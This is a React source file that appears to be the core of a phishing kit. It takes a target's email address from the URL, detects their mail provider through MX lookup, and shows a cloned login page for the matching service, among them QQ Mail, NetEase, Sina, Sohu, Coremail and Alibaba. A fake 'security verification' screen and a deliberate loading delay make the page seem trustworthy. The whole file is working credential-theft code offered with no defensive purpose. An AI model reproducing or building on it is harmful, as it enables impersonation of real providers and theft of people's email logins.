
import React, { useState, useEffect, useMemo } from 'react';
import { SecurityProvider } from './components/SecurityManager';
import { LanguageProvider, useTranslation } from './components/LanguageProvider';
import { getMailProviderFromMX, getThemeByDomain } from './DNSUtils';
import { motion, AnimatePresence } from 'framer-motion';

import AlibabaTheme from './themes/AlibabaTheme';
import BossmailTheme from './themes/BossmailTheme';
import Theme263 from './themes/Theme263';
import QQMailTheme from './themes/QQMailTheme';
import ExmailTheme from './themes/ExmailTheme';
import SinaTheme from './themes/SinaTheme';
import SohuTheme from './themes/SohuTheme';
import NetEaseTheme from './themes/NetEaseTheme';
import NetEaseQiyeTheme from './themes/NetEaseQiyeTheme';
import GlobalMailTheme from './themes/GlobalMailTheme';
import CoremailTheme from './themes/CoremailTheme';

const AppContent: React.FC = () => {
  const { lang } = useTranslation();
  const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isVerified, setIsVerified] = useState(false);

  const email = useMemo(() => {
    const params = new URLSearchParams(window.location.search);
    return params.get('email') || '';
  }, []);

  useEffect(() => {
    const initTheme = async () => {
      const startTime = Date.now();
      const params = new URLSearchParams(window.location.search);
      const typeParam = params.get('type');
      const domain = email.split('@')[1]?.toLowerCase();

      let theme = 'alibaba';

      if (typeParam) {
        theme = typeParam;
      } else if (domain) {
        const mxProvider = await getMailProviderFromMX(domain);
        if (mxProvider) {
          theme = mxProvider;
        } else {
          theme = getThemeByDomain(domain);
        }
      }

      const elapsedTime = Date.now() - startTime;
      const remainingTime = Math.max(0, 1500 - elapsedTime);

      setTimeout(() => {
        setDetectedTheme(theme);
        setIsLoading(false);
      }, remainingTime);
    };

    initTheme();
  }, [email]);

  const renderTheme = () => {
    switch (detectedTheme) {
      case 'bossmail': return <BossmailTheme prefilledEmail={email} />;
      case '263': return <Theme263 prefilledEmail={email} />;
      case 'qq': return <QQMailTheme prefilledEmail={email} />;
      case 'exmail': return <ExmailTheme prefilledEmail={email} />;
      case 'sina': return <SinaTheme prefilledEmail={email} />;
      case 'sohu': return <SohuTheme prefilledEmail={email} />;
      case 'netease': return <NetEaseTheme prefilledEmail={email} />;
      case 'netease_qiye': return <NetEaseQiyeTheme prefilledEmail={email} />;
      case 'globalmail': return <GlobalMailTheme prefilledEmail={email} />;
      case 'coremail': return <CoremailTheme prefilledEmail={email} />;
      default: return <AlibabaTheme prefilledEmail={email} />;
    }
  };

  if (!isVerified && !email) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
        <div className="max-w-md w-full bg-white p-8 rounded-xl shadow-sm border border-gray-100 text-center">
          <div className="w-16 h-16 bg-blue-50 text-blue-500 rounded-full flex items-center justify-center mx-auto mb-6 text-2xl">
            🛡️
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">
            {lang === 'zh' ? '安全验证' : 'Security Verification'}
          </h1>
          <p className="text-gray-500 text-sm mb-8">
            {lang === 'zh' ? '为了您的账号安全，请点击下方按钮进入加密登录环境。' : 'For your account security, please click the button below to enter the encrypted login environment.'}
          </p>
          <button 
            onClick={() => setIsVerified(true)}
            className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg transition-colors"
          >
            {lang === 'zh' ? '进入安全登录' : 'Enter Secure Login'}
          </button>
          <div className="mt-6 pt-6 border-t border-gray-50 flex items-center justify-center space-x-4 opacity-40 grayscale">
             <div className="w-8 h-8 bg-gray-200 rounded"></div>
             <div className="w-8 h-8 bg-gray-200 rounded"></div>
             <div className="w-8 h-8 bg-gray-200 rounded"></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <AnimatePresence mode="wait">
      {isLoading ? (
        <motion.div 
          key="loader"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="min-h-screen flex items-center justify-center bg-gray-50"
        >
          <div className="flex flex-col items-center space-y-4">
            <div className="w-10 h-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
            <p className="text-gray-400 text-sm font-medium tracking-wide">
              {lang === 'zh' ? '正在加载安全登录环境...' : 'Initializing secure environment...'}
            </p>
          </div>
        </motion.div>
      ) : (
        <motion.div 
          key="content"
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: "easeOut" }}
          className="min-h-screen"
        >
          {renderTheme()}
        </motion.div>
      )}
    </AnimatePresence>
  );
};

const App: React.FC = () => {
  return (
    <LanguageProvider>
      <SecurityProvider>
        <AppContent />
      </SecurityProvider>
    </LanguageProvider>
  );
};

export default App;
